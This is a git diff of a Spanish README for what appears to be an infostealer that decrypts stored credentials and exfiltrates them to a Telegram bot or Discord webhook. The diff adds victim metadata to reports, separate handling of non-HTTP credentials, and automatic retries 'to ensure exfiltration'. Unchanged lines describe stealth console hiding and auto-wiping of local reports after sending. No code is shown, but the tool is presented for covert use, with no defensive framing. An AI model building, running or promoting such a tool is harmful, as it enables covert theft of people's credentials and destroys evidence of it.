@@ -46,8 +46,11 @@ La suite escanea y descifra automáticamente los siguientes objetivos:
   * Envío instantáneo de reportes vía **Bot de Telegram** o **Webhooks de Discord**.
 * **📊 Reportes Dinámicos**:
   * Generación de informes estéticos en **HTML Interactivo** o archivos **CSV**.
+  * **Metadata Enriquecida**: Hostname, Usuario, PID y Versión incluidos en cada reporte.
+  * **Sección de Filtrados**: Identificación y visualización separada de credenciales no-HTTP (protocolos locales, extensiones, etc.).
 * **🕵️ Arquitectura de Sigilo (Stealth)**:
   * Limpieza automática de bases de datos temporales y **Auto-Wipe** del reporte local tras exfiltración.
+  * **Resiliencia de Red**: Sistema de reintentos automático para asegurar la exfiltración ante micro-cortes.
 
 ---
 
@@ -122,8 +125,9 @@ Para obtener instrucciones detalladas sobre flujos híbridos (Windows + WSL) o p
 | **`-c`** | `--telegram-chatid` | ID del chat de Telegram (Plano o B64). |
 | **`-d`** | `--discord` | URL del Webhook de Discord (Plano o B64). |
 | `-s` | `--stealth` | Oculta la consola en tiempo real (idéntico a `.exe --noconsole`). |
-| — | `--no-wipe` | Evita auto-borrado del reporte. |
-| `-v` | `--verbose` | Modo verboso (logs detallados). |
+| — | `--no-wipe` | Evita auto-borrado del reporte local tras envío. |
+| — | `--clean` | Elimina todos los reportes acumulados (`.html`, `.csv`) en la carpeta de salida. |
+| `-v` | `--verbose` | Modo verboso (logs detallados de depuración). |
 
 ---
 
